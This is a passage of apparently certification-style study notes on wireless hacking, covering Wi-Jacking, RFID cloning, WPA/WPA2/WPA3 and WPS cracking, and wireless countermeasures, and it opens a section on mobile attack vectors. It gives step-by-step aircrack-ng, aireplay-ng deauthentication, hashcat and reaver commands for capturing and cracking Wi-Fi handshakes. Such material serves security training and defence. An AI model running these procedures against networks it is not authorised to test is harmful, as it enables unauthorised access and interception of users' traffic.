					- Once sufficient information is gathered, the attacker initiates a man-in-the-middle (MITM) attack by deploying a fake tower to intercept and manipulate user data intended for the real tower. Using DNS spoofing, the attacker redirects the victim to a malicious website or a controlled site where sensitive user information, such as usernames and passwords, can be stolen.
		- Wi-Jacking Attack:
			- Attackers use a Wi-Jacking attack to gain access to a large number of wireless networks. In this attack, the Wi-Fi credentials of nearby victims can be retrieved without the need for traditional cracking methods. This attack is effective when credentials are saved in the victim’s browser, when the victim frequently accesses the same website, and when the router’s configuration interface is accessed via an unencrypted HTTP connection. Attackers can exploit these vulnerabilities to crack WPA/WPA2 networks without performing a handshake process.
			- Prerequisites for a Wi-Jacking Attack:
				- To successfully execute a Wi-Jacking attack, the following conditions must be met:
				- At least one active client device must be connected to the target network.
				- The client device must have previously connected to an open network and allow automatic reconnection.
				- The client device must use a Chromium-based web browser.
				- The client device’s browser must store the router’s admin interface credentials.
				- The target network’s router must use an unencrypted HTTP connection for its configuration interface.
			- Steps to Execute a Wi-Jacking Attack:
				- De-authentication: Send de-authentication requests to the victim’s device using aireplay-ng to disconnect it from the legitimate Wi-Fi network.
				- KARMA Attack: Use hostapd-wpe to perform a KARMA attack, tricking the victim into connecting to a malicious Wi-Fi network.
				- Injecting a Malicious URL: After successful de-authentication, use tools such as dnsmasq and Python scripts to inject a malicious URL, forcing the victim’s browser to load it. The URL/page pair is determined based on the BSSID and ESSID.
				- Waiting for HTTP Access: Once the victim accesses an HTTP page, the router is updated and automatically restarted.
				- Credential Harvesting: When the victim opens the malicious page, the browser checks the following conditions before auto-filling stored credentials:
					- Does the malicious URL match the origin of the router’s admin interface?
					- Do the input fields on the malicious page match those on the router’s admin interface?
				- Maintaining Access: After retrieving the credentials, the victim is kept on the malicious page briefly. The KARMA attack is then stopped, allowing the victim to reconnect to the legitimate network. However, the malicious page remains in the router’s admin interface, with stored admin credentials accessible via JavaScript.
				- Exploiting Credentials: Attackers use XMLHttpRequest to log into the router, extract the WPA2 PSK, and make other unauthorized modifications. With this PSK and other credentials, the victim’s private network can be compromised, allowing attackers to access and tamper with critical data using the Wi-Jacking technique.
		- RFID Cloning Attack:
			- RFID cloning involves capturing data from a legitimate RFID tag and then creating its clone using a new chip. In other words, data from one RFID tag is copied onto another by modifying the tag ID (TID), while the form factor and other data may remain the same. However, the cloned tag differs from the original and can often be detected. Attackers use devices such as iCopy-X, RFIDler, and Flipper Zero to clone RFID tags.
			- RFID Cloning Tools:
				- iCopyCX (icopyx.com): iCopy-X is a portable RFID cloning device that attackers can use to duplicate RFID tags. It is a fully stand-alone device with an integrated screen and buttons, offering the functionality of a Proxmark without requiring an external computer.
				- RFIDler (github.com)
				- RFID Mifare Cloner (github.com)
				- Flipper Zero (flipperzero.one)
				- Boscloner Pro (www.boscloner.com)
	- Wi-Fi Encryption Cracking:
		- After an attacker gains unauthorized access to a target network through methods such as wireless attacks, rogue access points (APs), and evil twin attacks, they must bypass the security mechanisms of the target wireless network. Wi-Fi networks typically use WPA, WPA2, or WPA3 encryption to secure communication, which the attacker must crack. This section examines how an attacker can compromise these encryption systems to breach wireless network security.
		- WPA/WPA2 Encryption Cracking:
			- WPA encryption is more secure than WEP encryption but remains vulnerable to certain attacks. An attacker can still crack WPA/WPA2 encryption by capturing specific types of packets. This process can be performed offline but requires the attacker to be near the AP for a short period.
			- The following techniques are commonly used to crack WPA encryption:
				- WPA-PSK Attack: WPA-PSK (Pre-Shared Key) uses a user-defined password to establish the four-way handshake. While this password cannot be directly extracted since it is a per-packet key, attackers can use dictionary attacks to brute-force the key. Weak or commonly used passwords are particularly susceptible to this method.
				- Offline Attack: To perform an offline attack, an attacker needs to be near the AP for a few seconds to capture the WPA/WPA2 authentication handshake. WPA encryption keys can then be cracked offline. During WPA handshakes, the protocol does not transmit the password directly, as these handshakes occur over insecure channels and in plaintext. Capturing a full authentication handshake from a client and the AP enables an attacker to break WPA/WPA2 encryption without requiring packet injection.
				- Deauthentication Attack: In a deauthentication attack, the attacker identifies an actively connected client and forces it to disconnect from the AP. When the client attempts to reconnect, the attacker uses tools like Aireplay to capture the authentication handshake. Since the authentication packet contains the Pairwise Master Key (PMK), attackers can use dictionary or brute-force attacks to recover the WPA key.
				- Brute-Force Attack on WPA Keys: Brute-force techniques are effective for breaking WPA/WPA2 encryption keys. Attackers can execute a brute-force attack using a dictionary or specialized tools such as Aircrack and Aireplay. However, brute-force attacks are computationally intensive and time-consuming—cracking WPA keys this way may take hours, days, or even weeks, depending on password complexity and available processing power.
		- Cracking WPA/WPA2 Using Aircrack-ng:
			- Cracking WPA/WPA2 using Aircrack-ng involves a series of steps to test the security of Wi-Fi networks. The process begins by enabling monitor mode on a compatible Wi-Fi adapter to capture traffic. Then, Airodump-ng is used to capture a WPA/WPA2 handshake, often facilitated by sending deauthentication packets to force client reconnection. Once a handshake is captured, Aircrack-ng attempts to crack the password by comparing it against a wordlist of potential passwords.
			- Steps to Crack WPA-PSK:
				- Enable Monitor Mode:
					- Run the following command to enable monitor mode on the wireless interface: airmon-ng start <wireless interface>
					- Note: If you encounter an error about conflicting processes, run: airmon-ng check kill
				- Scan for Access Points:
					- Use Airodump-ng to list detected access points (APs) and connected clients: airodump-ng <wireless interface>
				- Select the Target AP:
					- From the displayed list, identify the target wireless access point (AP) and note its BSSID and channel.
				- Capture Traffic from the Target AP:
					- Open a new terminal and run the following command as root to capture packets from the target AP: airodump-ng --bssid <BSSID> -c <channel> -w <output file> <wireless interface>
					- Leave this terminal running.
				- Send Deauthentication Packets:
					- Open a new terminal and send deauthentication packets multiple times to disconnect a client from the AP, forcing it to reconnect: aireplay-ng -0 11 -a <BSSID> -c <client MAC> <wireless interface>
				- Capture the WPA Handshake:
					- Switch back to the Airodump-ng terminal and continue capturing packets. Once a WPA handshake is detected (e.g., WPA Handshake: 22:7F:AC:6D:E6:8B), the handshake is saved in a .cap file.
				- Crack the Captured Handshake:
					- Open a new terminal and use Aircrack-ng to attempt to crack the password using a wordlist: aircrack-ng -a2 -b <BSSID> -w password.txt <captured file>.cap
				- Check for Cracked Password:
					- If successful, Aircrack-ng will display the message: KEY FOUND! [ <cracked password> ]
					- Note: If the password is complex, cracking may take a long time, depending on processing power and the strength of the wordlist.
			- WPA/WPA2 Cracking Tools:
				- hashcat (hashcat.net)
				- EAPHammer (github.com)
				- Portable Penetrator (www.secpoint.com)
				- WepCrackGui (sourceforge.net)
				- Wifite (github.com)
		- WPA Brute-Forcing Using Fern Wi-Fi Cracker:
			- Fern Wi-Fi Cracker is a wireless security auditing and attack tool written in Python, utilizing the Python Qt GUI library. It can crack and recover WPA/WPS keys and execute various network-based attacks on wireless and Ethernet networks.
			- Steps to Perform WPA Brute-Forcing:
				- Launch Fern Wi-Fi Cracker:
					- Run the following command to start the tool: sudo fern-wifi-cracker
				- Enable Monitor Mode:
					- Select the Wi-Fi adapter from the drop-down menu.
					- Click the "Monitor Mode" button to enable monitor mode.
				- Scan for Access Points:
					- Click "Scan for Access Points" to detect nearby Wi-Fi networks.
					- Select a target WPA/WPA2 network from the list of discovered networks.
				- Initiate a Deauthentication Attack:
					- Click the "Attack" button next to the target network.
					- This forces connected clients to re-authenticate, allowing the tool to capture the WPA handshake.
				- Capture the WPA Handshake:
					- The tool will notify you once it successfully captures a WPA handshake.
				- Select a Wordlist for Brute-Forcing:
					- Choose a wordlist file containing potential passwords (e.g., rockyou.txt, located in /usr/share/wordlists/).
				- Start the WPA Attack:
					- Click the "Start WPA Attack" button.
					- The tool will test each password from the wordlist against the captured handshake.
					- If the correct password is found, it will be displayed on the screen.
		- WPA3 Encryption Cracking:
			- The WPA3 Wi-Fi security standard replaces WPA2's four-way (PSK) handshake with the Dragonfly (SAE) handshake, providing stronger password-based authentication. However, WPA3 is still vulnerable to password-cracking attacks. Dragonblood is a set of vulnerabilities in the WPA3 security standard that allows attackers to recover encryption keys, downgrade security mechanisms, and launch various information-theft attacks.
			- Attackers can exploit these vulnerabilities using tools such as Dragonslayer, Dragonforce, Dragondrain, and Dragontime to target WPA3-enabled networks.
			- Techniques Used to Crack WPA3 Encryption:
				- Downgrade Security Attacks:
					- To perform this attack, both the client and AP (Access Point) must support both WPA3 and WPA2 encryption. The attacker forces the user to connect using the older WPA2 encryption method, making it easier to exploit.
					- Downgrade Security Attack Methods:
						- Exploiting Backward Compatibility: If a user and AP support both WPA2 and WPA3, an attacker can set up a rogue AP that only supports WPA2. This forces the client to connect using WPA2’s weaker four-way handshake. Once the connection is established, the attacker can use various attack tools to exploit or crack WPA2 encryption.
						- Exploiting the Dragonfly Handshake: The attacker impersonates a legitimate AP. When a user attempts to connect using WPA3 authentication, the attacker claims WPA3 is unsupported and suggests switching to WPA2. Once the user connects via WPA2, the attacker can exploit known WPA2 vulnerabilities to crack the encryption.
				- Side-Channel Attacks (Information-Leaking Attacks):
					- Attackers target protocols or encryption mechanisms used by devices attempting to connect to a network. During the key-exchange process, the attacker captures leaked information and uses it for brute-force or dictionary attacks to obtain user data.
					- Types of Side-Channel Attacks:
						- Timing-Based Attack: The attacker analyzes the time taken by the Dragonfly handshake to process password authentication. By observing encoding iterations, the attacker narrows down possible passwords. After compiling a shortlist of potential passwords, they attempt to gain access using various cracking techniques.
						- Cache-Based Attack: The attacker injects malicious JavaScript or a web application into the target user’s browser. This allows them to monitor memory access patterns and extract password-related data, ultimately compromising network security.
		- Cracking WPA3 Using Aircrack-ng and Hashcat (hashcat.net):
			- The following steps outline how to crack WPA3 encryption using hcxtools to convert captured raw packets into a hash format, followed by Hashcat to crack the handshake.
			- Steps to Crack WPA3 Encryption:
				- Enable Monitor Mode:
					- Run the following command to set the wireless interface to monitor mode: airmon-ng start <wireless_interface>
				- Capture the Handshake:
					- Open a new terminal and run Airodump-ng as root to capture the handshake: airodump-ng wlan0mon
					- Alternatively, to target a specific network, use: airodump-ng --bssid <BSSID> --channel <CH> --write capture wlan0mon
				- Deauthenticate a Client:
					- Force a connected client to reconnect, capturing the handshake in the process: aireplay-ng --deauth 10 -a <BSSID> -c <client_MAC> wlan0mon
				- Convert the Captured Handshake to Hash Format:
					- Use hcxtools to convert the captured .cap file into .hccapx format: hcxpcapngtool -o capture.hccapx <capture>.cap
				- Crack the Handshake Using Hashcat:
					- Use Hashcat with a wordlist to attempt to crack the WPA3 password: hashcat -m 22000 capture.hccapx </path/to/wordlist.txt>
		- Cracking WPS Using Reaver (github.com):
			- Reaver is a powerful tool designed to exploit Wi-Fi Protected Setup (WPS) registrar PINs to recover WPA/WPA2 passphrases. It has been tested against a wide range of APs (Access Points) and WPS implementations.
			- Steps to Crack a WPS PIN Using Reaver:
				- Enable Monitor Mode:
					- Set up a wireless interface in monitor mode using Airmon-ng: airmon-ng start <interface>
					- Example: airmon-ng start wlan0
				- Detect WPS-Enabled Devices:
					- Use the Wash utility to scan for WPS-enabled devices: wash -i <interface>
					- Example: wash -i mon0
				- Alternative Device Detection (If Wash Fails):
					- If Wash does not detect WPS-enabled devices, use Airodump-ng: airodump-ng <interface>
					- Example: If the monitor-mode interface is wlan0mon, run: airodump-ng wlan0mon
					- This command lists all available APs, including their BSSIDs (MAC addresses).
				- Start Cracking the WPS PIN Using Reaver
					- Once the BSSID of the target device is identified, run Reaver: reaver -i <monitor-mode interface> -b <BSSID> -vv
					- Example: reaver -i wlan0mon -b B4:75:0E:89:00:60 -vv
					- The command iterates through WPS PINs until a valid one is found.
					- Once the WPS PIN is cracked, Reaver extracts the WPA/WPA2 passphrase.
- Wireless Attack Countermeasures:
	- Wireless Security Layers:
		- A wireless security mechanism consists of six layers. This layered approach improves the ability to prevent an attacker from compromising the network and increases the likelihood of detecting malicious activities.
		- The Structure of Wireless Security Layers:
			- Wireless Signal Security:
				- In wireless networks, the network and RF spectrum within the environment should be continuously monitored and managed to identify threats and enhance situational awareness. A Wireless Intrusion Detection System (WIDS) analyzes and monitors the RF spectrum. It generates alerts to detect unauthorized wireless devices that violate network security policies. Activities such as increased bandwidth usage, RF interference, and unidentified rogue wireless access points (APs) may indicate the presence of a malicious intruder. Continuous network monitoring is the most effective measure to prevent such attacks and secure the network.
			- Connection Security:
				- Per-frame/packet authentication provides protection against Man-in-the-Middle (MITM) attacks. It prevents attackers from intercepting data when two legitimate users communicate, ensuring a secure connection.
			- Device Security:
				- Both vulnerability management and patch management are critical components of a secure infrastructure. Regular updates and security patches help protect devices from potential exploits.
			- Data Protection:
				- Encryption algorithms such as WPA3, WPA2, and AES safeguard data from unauthorized access and interception.
			- Network Protection:
				- Strong authentication mechanisms ensure that only authorized users can access the network, reducing the risk of unauthorized intrusions.
			- End-User Protection:
				- Even if an attacker connects to an AP, personal firewalls installed on end-user systems within the WLAN can prevent unauthorized access to files and other sensitive information.
	- Defense Against WPA/WPA2/WPA3 Cracking:
		- Use Strong Passwords:
			- Ensure that the Wi-Fi password (pre-shared key) is strong, complex, and difficult to guess.
			- Use a password that is at least 12–16 characters long, including uppercase and lowercase letters, numbers, and special characters.
		- Client Settings:
			- Use WPA2 with AES/CCMP encryption only.
			- Set proper client settings (e.g., validate the server, specify the server address, and do not prompt for new servers).
			- Regenerate keys for every new connection.
		- Additional Controls:
			- Use virtual private network (VPN) technologies such as remote access VPN, extranet VPN, and intranet VPN.
			- Implement secure communication protocols such as IPsec and SSL/TLS.
			- Deploy Network Access Control (NAC) or Network Access Protection (NAP) solutions for additional control over end-user connectivity.
		- Disable TKIP:
			- Disable TKIP in the router settings and ensure that only AES encryption is used.
		- MAC Address Filtering:
			- Allow only devices with specific MAC addresses to connect to the network.
		- Upgrade to WPA3:
			- WPA3 offers better protection against brute-force attacks and prevents the exploitation of connected devices.
		- Disable Remote Management:
			- Turn off remote management features on routers to prevent external attacks.
		- Disable WPS:
			- WPS (Wi-Fi Protected Setup) has known vulnerabilities that attackers can exploit. Disable WPS in the router settings to prevent brute-force attacks on the WPS PIN.
		- Regularly Update Router Firmware:
			- Keep the router's firmware up to date to patch known vulnerabilities.
			- Check the manufacturer's website regularly for firmware updates and apply them promptly.
		- Reduce Signal Range:
			- Limit the Wi-Fi signal range to reduce the chances of unauthorized access from outside the premises.
			- Adjust the router's transmission power and place it centrally within the desired location.
		- Monitor Network Activity:
			- Regularly monitor the network for unusual activity or unauthorized devices.
			- Use network monitoring tools to detect and respond to suspicious activities.
		- Enable WPA3-SAE:
			- WPA3-SAE (Simultaneous Authentication of Equals) provides stronger security by protecting against offline dictionary attacks and offering forward secrecy.
			- Use WPA3-SAE whenever possible for all compatible devices.
		- Disable Transition Mode:
			- WPA3 allows for a WPA2/WPA3 mixed mode, which can introduce security risks.
			- If all devices support WPA3, disable transition mode to ensure the highest level of security.
	- Defense Against KRACK Attacks:
		- The following countermeasures help prevent KRACK (Key Reinstallation Attack) attacks:
		- Update all routers and Wi-Fi devices with the latest security patches.
		- Enable automatic updates for all wireless devices and patch firmware regularly.
		- Avoid using public Wi-Fi networks whenever possible.
		- Browse only secure websites and avoid accessing sensitive resources when connected to an unprotected network.
		- Audit IoT devices and ensure they do not connect to insecure Wi-Fi routers.
		- Enable the HTTPS Everywhere extension for secure browsing.
		- Use two-factor authentication (2FA) for enhanced security.
		- Use a VPN to encrypt data in transit and protect against eavesdropping.
		- Always use WPA3 for wireless networks to enhance security.
		- Disable fast roaming and repeater mode on wireless devices to mitigate KRACK attack risks.
		- Employ the EAPOL-key replay counter to ensure that the access point (AP) recognizes only the latest counter value.
		- Use a backup wired connection (Ethernet) or mobile data if a vulnerability to KRACK attacks is detected.
		- Consider using third-party routers instead of ISP-provided routers if they lack sufficient security patches.
		- Implement network segmentation to separate critical parts of the network from general user access, reducing the potential impact of a KRACK attack.
		- Temporarily disable the 802.11r protocol, which is vulnerable to KRACK attacks. Turn off 802.11r in wireless settings if seamless roaming is not required.
		- Use 802.1X authentication for an added layer of security. Implement 802.1X with RADIUS server authentication for enterprise networks.
	- Defense Against aLTEr Attacks:
		- The most effective method to defend a network against aLTEr attacks is to encrypt DNS queries using proper security standards. To implement this, Cisco, in collaboration with Apple, developed an app called "Cisco Security Connector." This app prevents clients from accessing unintended websites by encrypting DNS queries and loading them into Cisco Umbrella (Intelligence Block) for further validation. It protects the network from IP-level and DNS-level hijacking.
		- The following countermeasures can help defend against aLTEr attacks:
			- Encrypt DNS queries and use only trusted DNS resolvers.
			- Resolve DNS queries using HTTPS (DoH) to enhance security.
			- Access only websites with HTTPS connections to prevent traffic interception.
			- Use DNS over TLS (DoT) or DNS over Datagram TLS (DTLS) to encrypt DNS traffic and ensure integrity protection.
			- Implement RFC 7858/RFC 8310 to prevent DNS spoofing attacks and enhance encryption for name resolution.
			- Add a Message Authentication Code (MAC) to user plane packets for integrity verification.
			- Use the DNSCrypt protocol to authenticate communication between DNS clients and resolvers.
			- Deploy mobile security tools, such as Zimperium, to detect phishing and malicious site attacks.
			- Enforce proper HTTPS parameters, such as HTTP Strict Transport Security (HSTS), to prevent redirection to malicious websites.
			- Utilize virtual network tunnels with integrity protection and endpoint authentication.
			- Upgrade to a 5G network connection to take advantage of improved security protocols.
			- Implement eSIM technology for enhanced authentication and encryption.
			- Deploy DNSSEC (Domain Name System Security Extensions) to secure DNS lookups and ensure the authenticity of response data.
			- Keep LTE network infrastructure updated, ensuring that base stations and core network components run the latest firmware and software.
			- Apply security patches regularly from network equipment vendors to fix known vulnerabilities.
			- Use robust encryption methods such as AES-256 for secure LTE data transmission and ensure end-to-end encryption.
			- Enable mutual authentication between User Equipment (UE) and the network to prevent unauthorized access.
			- Deploy secure SIM cards with advanced security features, including over-the-air (OTA) updates and secure storage, to prevent cloning and unauthorized access.
			- Enforce location-based access controls to restrict network services based on user equipment's geographical location, limiting access from unauthorized regions.
			- Secure physical network infrastructure using surveillance, access controls, and tamper-evident seals to prevent unauthorized tampering with network equipment.
	- Detection and Blocking of Rogue APs:
		- Detection of Rogue APs:
			- RF Scanning: Deploy RF sensors (repurposed APs that perform packet capturing and analysis) throughout the wired network to detect and alert the WLAN administrator about unauthorized wireless devices.
			- AP Scanning: Utilize APs with built-in capabilities to detect neighboring APs and expose this data through their MIBs and web interfaces.
			- Wired-Side Inputs: Use network management software to identify rogue APs by detecting devices connected to the LAN through protocols such as Telnet, SNMP, and Cisco Discovery Protocol (CDP).
			- Comparison with Authorized AP List: Maintain a list of authorized APs and compare detected APs against this list to identify unauthorized devices. Tools like AirMagnet WiFi Analyzer can facilitate this comparison.
			- Signal Strength Analysis: Analyze the signal strength of detected APs to identify unauthorized devices that may be physically close. Tools such as Ekahau Survey for Wi-Fi Planning and Analysis can help detect unexpected APs based on their signal strength.
			- MAC Address Filtering: Monitor network traffic for MAC addresses of authorized APs and flag any unknown MAC addresses. Cisco Wireless LAN Controllers provide built-in rogue AP detection and MAC address filtering features.
		- Blocking of Rogue APs:
			- Deny Wireless Service: Launch a denial-of-service (DoS) attack on the rogue AP to prevent it from serving new clients.
			- Block the Switch Port: Disable the switch port to which the rogue AP is connected, or manually locate and physically remove the AP from the LAN.
			- Wireless Intrusion Prevention Systems (WIPS): Implement WIPS to continuously monitor the wireless spectrum and automatically block unauthorized devices.
			- Access Control Lists (ACLs): Restrict network access to known, authorized MAC addresses.
			- Implement 802.1X Authentication: Enforce network authentication to ensure only authorized users and devices can connect.
			- Network Segmentation: Isolate critical resources from general wireless access to limit exposure to rogue APs.
			- Disable Open SSID Broadcasting: Prevent unauthorized connections by turning off SSID broadcasting for open networks.
			- MAC Address Whitelisting: Maintain a whitelist of authorized MAC addresses and configure the wireless controller to block all others.
	- Defense Against Wireless Attacks:
		- Best Practices for Secure Configuration:
			- Change the default SSID after configuring the WLAN.
			- Set a strong router access password and enable firewall protection.
			- Disable SSID broadcasts.
			- Disable remote router login and wireless administration.
			- Enable MAC address filtering on access points (APs) or routers.
			- Enable encryption on APs and update passphrases regularly.
			- Close all unused ports to prevent attacks on APs.
			- Segregate the network to ensure guests cannot access the private network.
			- Use closed networks and manually provide the SSID to employees instead of allowing selection from a broadcast list.
			- Disable the Dynamic Host Configuration Protocol (DHCP) and use static IP addresses.
			- Disable the Simple Network Management Protocol (SNMP). If required, configure it with the least privileges.
			- Change the default IP address of the router console.
			- Always use WPA3 encryption if supported; if unavailable, use WPA2 with AES encryption.
			- Disable Wi-Fi Protected Setup (WPS) on the router.
			- Use VLANs or separate SSIDs to segment different types of traffic.
			- Adjust the router's transmission power to limit Wi-Fi signal range to necessary areas.
			- Disable unnecessary services and close unused ports.
			- Use the router’s built-in firewall to filter incoming and outgoing traffic.
			- Set up a separate guest network with restricted access to main network resources.
		- Best Practices for SSID Settings:
			- Use SSID cloaking to prevent default wireless messages from broadcasting the SSID.
			- Avoid using the SSID, company name, network name, or any easily guessable string in passphrases.
			- Place a firewall or packet filter between access points (APs) and the corporate intranet.
			- Limit the wireless network's signal strength to prevent detection outside the organization's premises.
			- Regularly check wireless devices for configuration or security issues.
			- Implement additional encryption techniques, such as IPsec over wireless, for enhanced security.
			- Modify the SSID with unique characters and strings instead of using the manufacturer's default.
			- Use a separate SSID for guest users to isolate them from the organizational network.
			- Segment the organizational network into multiple zones with distinct SSIDs to reduce attack impact.
			- Keep SSID broadcasting disabled for organizational wireless networks.
			- Ensure each SSID is secured with WPA3 encryption if supported or WPA2 with AES encryption as a minimum.
			- Periodically change SSIDs and associated passwords for enhanced security.
		- Best Practices for Authentication:
			- Enable WPA3 for the highest level of security, as it provides enhanced encryption and protection against attacks.
			- If WPA3 is not supported, use WPA2 with AES encryption (avoid WPA or TKIP).
			- Use 802.1X authentication with a RADIUS server for enterprise networks to provide individual credentials for each user.
			- Implement multifactor authentication (MFA) where possible for an added layer of security.
			- Ensure proper management of digital certificates in 802.1X deployments, including strong encryption and regular updates.
			- Disable the network when not in use to minimize attack exposure.
			- Place wireless access points (APs) in secure locations to prevent unauthorized physical access.
			- Keep drivers and firmware on all wireless equipment up to date.
			- Use a centralized authentication server to manage network access efficiently.
			- Enable server verification on client devices using 802.1X authentication to prevent man-in-the-middle (MITM) attacks.
			- Deploy rogue AP detection or wireless intrusion prevention/detection systems (WIPS/WIDS) to identify and block unauthorized devices.
	- Wireless Intrusion Prevention Systems (WIPS):
		- A wireless intrusion prevention system (WIPS) is a network device that monitors the radio spectrum to detect unauthorized access points (APs) in nearby locations without the host’s permission. It can also implement countermeasures automatically. WIPS protects networks against wireless threats and enables administrators to detect and prevent various network attacks.
		- WIPS Deployment:
			- A WIPS consists of several components that work together to provide a unified security monitoring solution.
			- Cisco’s WIPS deployment includes the following components and functions:
				- APs in monitor mode: These APs continuously scan channels, detect attacks, and capture packets.
				- Mobility Services Engine (MSE) running a wireless IPS service: The central aggregation point for alarms from all controllers and their respective wireless IPS monitor-mode APs. It also stores alarm information and forensic files for archival.
				- Local mode APs: These APs provide wireless service to clients while performing time-sliced rogue detection and location scanning.
				- Wireless LAN controllers (WLCs): These controllers forward attack information from wireless IPS monitor-mode APs to the MSE and distribute configuration parameters to APs.
				- Wireless Control System (WCS): This system allows administrators to configure the wireless IPS service on the MSE, push wireless IPS configurations to controllers, and set APs to wireless IPS monitor mode. It is also used for viewing wireless IPS alarms, forensics, reporting, and accessing the threat encyclopedia.
	- Wi-Fi Security Auditing Tools:
		- Cisco Adaptive Wireless IPS (www.cisco.com):
			- The Cisco Adaptive Wireless Intrusion Prevention System (IPS) provides advanced network security through dedicated monitoring and detection of wireless network anomalies, unauthorized access, and RF attacks. Fully integrated with the Cisco Unified Wireless Network, this solution offers comprehensive visibility and control without requiring an overlay system.
			- Adaptive WIPS enhances wireless network security by detecting and mitigating malicious attacks and vulnerabilities. It also empowers security professionals to identify, analyze, and respond to wireless threats effectively.
		- RFProtect (www.arubanetworks.com)
		- Fern Wifi Cracker (github.com)
		- OSWA-Assistant (securitystartshere.org)
		- BoopSuite (github.com)
		- Wifite (github.com)
	- Wi-Fi Intrusion Prevention Systems (IPSs):
		- Wi-Fi IPSs protect wireless networks by automatically scanning, detecting, and classifying unauthorized access points and rogue traffic. This prevents neighboring users or skilled hackers from gaining unauthorized access to Wi-Fi network resources.
		- WatchGuard Wi-Fi Cloud WIPS (www.watchguard.com):
			- WatchGuard Wi-Fi Cloud WIPS defends against unauthorized devices and rogue access points, prevents evil twin attacks, and mitigates malicious threats such as denial-of-service (DoS) attacks with near-zero false positives. It ensures high-performance wireless connectivity while maintaining robust security.
		- Extreme AirDefense (www.extremenetworks.com)
		- Arista WIPS (www.arista.com)
		- SonicWall Wireless Network Manager (www.sonicwall.com)
		- Cisco Meraki (www.cisco.com)
		- FortiGate Next-Generation Firewall (NGFW) (www.fortinet.com)


--------------------------------------------------

# Hacking Mobile Platforms

- Mobile Platform Attack Vectors:
	- Mobile security is becoming increasingly challenging due to the emergence of complex attacks that use multiple attack vectors to compromise mobile devices. These security threats exploit critical data, financial information, and other sensitive details of mobile users. They can also damage the reputation of mobile networks and organizations.
	- This section explores vulnerabilities in the mobile business environment, the OWASP Top 10 mobile risks, the anatomy of mobile attacks, mobile attack vectors, associated vulnerabilities and risks, security issues related to app stores, app sandboxing challenges, mobile spam, and the risks of pairing mobile devices over open Bluetooth and Wi-Fi connections, among other mobile threats.
	- Vulnerable Areas in the Mobile Business Environment (www.ibm.com):
		- Smartphones are widely used for both business and personal purposes, making them valuable targets for attackers seeking to steal corporate or personal data. Security threats to mobile devices have increased due to greater Internet connectivity, the widespread use of commercial and third-party applications, and various communication methods.
		- In addition to mobile-specific threats, mobile devices are also vulnerable to many risks that affect desktop and laptop computers, web applications, and networks. Modern smartphones offer Internet and network connectivity through multiple channels, including 3G/4G/5G, Bluetooth, Wi-Fi, and wired computer connections. Security threats can emerge at different points along these communication paths during data transmission.
	- OWASP Top 10 Mobile Risks - 2024 (owasp.org):
		- M1 - Improper Credential Usage:
			- This category covers risks associated with insecure credential handling, such as storing hardcoded credentials, saving them in unprotected locations, or transmitting them over insecure channels. Weak authentication methods also fall under this category. Attackers exploit these vulnerabilities to gain unauthorized access to user accounts, sensitive data, or backend systems, leading to potential data breaches and financial loss.
		- M2 - Inadequate Supply Chain Security:
			- This risk stems from using outdated or vulnerable third-party components in mobile applications. Supply chain weaknesses often result from insecure coding practices, insufficient testing, or inadequate security controls in app signing and distribution. Attackers exploit these vulnerabilities to insert malicious code, introduce backdoors, or compromise app signing keys, potentially leading to data theft, espionage, or denial-of-service (DoS) attacks.
		- M3 - Insecure Authentication/Authorization:
			- This category involves weaknesses in authentication and authorization mechanisms, such as weak password policies, insecure token handling, or improper authorization checks. Attackers exploit these flaws to impersonate users, hijack sessions, or bypass authentication mechanisms using malware or botnets to gain unauthorized access to sensitive data.
		- M4 - Insufficient Input/Output Validation:
			- Failing to properly validate or sanitize user input can lead to security issues such as SQL injection, command injection, and cross-site scripting (XSS). These vulnerabilities may arise from flawed application logic, lack of security awareness, or inadequate testing. Exploiting them can allow attackers to manipulate data, execute malicious code, or crash the application.
		- M5 - Insecure Communication:
			- Mobile applications that use outdated or improperly configured encryption protocols, insecure SSL/TLS certificates, or unprotected data transmission channels are vulnerable to interception and tampering. Attackers can exploit these weaknesses to steal sensitive information, impersonate users, or carry out identity theft, espionage, and fraudulent activities.
		- M6 - Inadequate Privacy Controls:
			- This risk arises from the improper handling of personally identifiable information (PII), such as names, addresses, and financial data. Weak access controls and noncompliance with privacy regulations can lead to identity theft, fraud, and regulatory fines. Attackers exploit these vulnerabilities to misuse personal data, eroding user trust and exposing organizations to legal consequences.
		- M7 - Insufficient Binary Protections:
			- This category includes threats like code tampering and reverse engineering, where attackers analyze or modify application code to bypass security measures. Weak binary protections allow attackers to insert malicious code, create counterfeit apps, or access paid features for free. These vulnerabilities also facilitate malware distribution via third-party app stores.
		- M8 - Security Misconfiguration:
			- Incorrect or incomplete security settings—such as weak encryption, unprotected storage, misconfigured access controls, or enabled debugging features—can expose mobile apps to attacks. Threat actors exploit these flaws to hijack accounts, access sensitive data, or compromise backend systems. Security misconfigurations often result from overlooked security best practices during development.
		- M9 - Insecure Data Storage:
			- Storing sensitive data in plaintext, using weak encryption, or failing to implement proper access controls exposes mobile apps to data breaches. Attackers may exploit these weaknesses through physical device access, malware, social engineering, or intercepting data transmissions. Consequences include identity theft, financial loss, and regulatory noncompliance.
		- M10 - Insufficient Cryptography:
			- Using weak encryption algorithms, poor key management, or flawed cryptographic implementations can allow attackers to decrypt sensitive data, bypass security mechanisms, or tamper with encrypted information. Weak cryptography undermines application security, enabling data breaches, unauthorized access, and user impersonation.
	- Anatomy of Mobile Attack (www.nowsecure.com):
		- The widespread adoption of bring your own device (BYOD) policies in organizations has made mobile devices a prime target for attacks. Attackers scan these devices for vulnerabilities, exploiting weaknesses at the device and network layers, the data center, or a combination of these.
		- Attack Vectors:
			- Attackers exploit vulnerabilities in the following areas to launch malicious attacks:
			- The Device:
				- Mobile device vulnerabilities pose significant risks to both personal and corporate data. Attackers targeting the device itself can exploit various entry points.
				- Browser-Based Attacks:
					- These attacks involve exploiting web browsers on mobile devices:
						- Phishing: Attackers send emails or pop-ups that redirect users to fake websites mimicking legitimate ones, tricking them into submitting personal information such as usernames, passwords, credit card details, addresses, and mobile numbers. Mobile users are particularly vulnerable because of small screen sizes, shortened URLs, limited warning messages, and scaled-down security indicators.
						- Framing: Attackers embed a malicious web page within a legitimate one using HTML <iFrame> elements. By exploiting this functionality, they use clickjacking techniques to steal sensitive user information.
						- Clickjacking: Also known as a user interface (UI) redress attack, this technique tricks users into clicking something different from what they perceive, leading to unauthorized actions such as information theft or device compromise.
						- Man-in-the-Mobile (MitMo): Attackers implant malicious code into a victim’s mobile device to bypass password verification systems that send one-time passwords (OTPs) via SMS or voice calls. The malware intercepts and relays these OTPs to the attacker.
